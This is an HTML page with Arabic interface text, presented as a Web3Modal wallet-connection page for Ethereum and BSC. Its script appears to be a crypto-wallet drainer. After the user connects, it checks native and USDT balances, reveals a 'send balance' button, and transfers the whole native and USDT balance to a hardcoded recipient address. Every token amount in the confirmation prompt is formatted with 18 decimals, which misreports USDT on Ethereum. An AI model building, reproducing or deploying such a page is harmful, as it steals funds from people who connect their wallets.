<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>محفظة Web3Modal v2</title>
  <script type="module">
    import { EthereumClient, w3mConnectors, w3mProvider } from 'https://unpkg.com/@web3modal/ethereum@2/dist/index.js'
    import { Web3Modal } from 'https://unpkg.com/@web3modal/html@2/dist/index.js'
    import { configureChains, createConfig } from 'https://unpkg.com/@wagmi/core@1/dist/index.js'
    import { mainnet, bsc } from 'https://unpkg.com/@wagmi/core@1/dist/chains.js'
    import { ethers } from 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js'

    const chains = [mainnet, bsc]
    const projectId = '8fc047ecb16bbb2a405a7ab9fc00bb2f' // تم استبدال Project ID هنا

    const { publicClient } = configureChains(chains, [w3mProvider({ projectId })])
    const wagmiConfig = createConfig({
      autoConnect: true,
      connectors: w3mConnectors({ projectId, version: 2, chains }),
      publicClient
    })

    const ethereumClient = new EthereumClient(wagmiConfig, chains)
    const web3Modal = new Web3Modal({ projectId, themeMode: 'dark' }, ethereumClient)

    let signer, provider, userAddress, chainId;

    window.connectWallet = async () => {
      try {
        const providerWagmi = await wagmiConfig.connectors[0].connect()
        provider = new ethers.providers.Web3Provider(providerWagmi)
        signer = provider.getSigner()
        userAddress = await signer.getAddress()
        const network = await provider.getNetwork()
        chainId = network.chainId

        alert(`تم الاتصال بالمحفظة:\n${userAddress}\nالشبكة: ${network.name}`)

        const balances = await checkBalances()
        if (balances.some(b => b.found)) {
          document.getElementById("sendBtn").style.display = "inline-block"
        } else {
          alert("لا يوجد رصيد كافٍ.")
        }
      } catch (e) {
        alert("فشل الاتصال: " + e.message)
      }
    }

    async function checkBalances() {
      const balances = []
      const nativeBalance = await provider.getBalance(userAddress)
      if (nativeBalance.gt(0)) {
        balances.push({ symbol: chainId === 56 ? "BNB" : "ETH", found: true, value: nativeBalance })
      } else {
        balances.push({ symbol: chainId === 56 ? "BNB" : "ETH", found: false })
      }

      const usdtAddresses = {
        1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        56: "0x55d398326f99059fF775485246999027B3197955"
      }
      const usdtAddress = usdtAddresses[chainId]
      if (usdtAddress) {
        const usdtAbi = [
          "function balanceOf(address) view returns (uint256)",
          "function transfer(address to, uint256 value) returns (bool)"
        ]
        const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer)
        const usdtBalance = await usdtContract.balanceOf(userAddress)
        balances.push({ symbol: "USDT", found: usdtBalance.gt(0), value: usdtBalance, contract: usdtContract })
      }

      return balances
    }

    window.sendFunds = async () => {
      const recipient = "0x9b767999d83651c244d2225a910a3a2456c98a3c"
      try {
        const balances = await checkBalances()
        let message = "هل تريد إرسال:\n\n"
        let hasFunds = false

        for (const token of balances) {
          if (token.found) {
            hasFunds = true
            const formatted = ethers.utils.formatUnits(token.value, 18)
            message += `- ${token.symbol}: ${formatted}\n`
          }
        }

        if (!hasFunds) return alert("لا يوجد رصيد.")

        const confirmSend = confirm(message + `\nإلى العنوان:\n${recipient}`)
        if (!confirmSend) return

        for (const token of balances) {
          if (!token.found) continue
          if (token.symbol === "ETH" || token.symbol === "BNB") {
            await signer.sendTransaction({ to: recipient, value: token.value })
          } else if (token.symbol === "USDT") {
            await token.contract.transfer(recipient, token.value)
          }
        }

        alert("تم إرسال الرصيد.")
      } catch (err) {
        alert("فشل الإرسال: " + err.message)
      }
    }
  </script>

  <style>
    body {
      background: #000;
      color: white;
      font-family: sans-serif;
      text-align: center;
      padding-top: 100px;
      direction: rtl;
    }

    button {
      font-size: 22px;
      padding: 14px 28px;
      background-color: #3396FF;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      margin: 10px;
    }

    button:hover {
      background-color: #0d78cc;
    }

    #sendBtn {
      display: none;
    }
  </style>
</head>
<body>
  <h1>اتصال بمحفظتك (Web3Modal v2)</h1>
  <button onclick="connectWallet()">الاتصال بالمحفظة</button>
  <button id="sendBtn" onclick="sendFunds()">إرسال الرصيد</button>
</body>
</html>
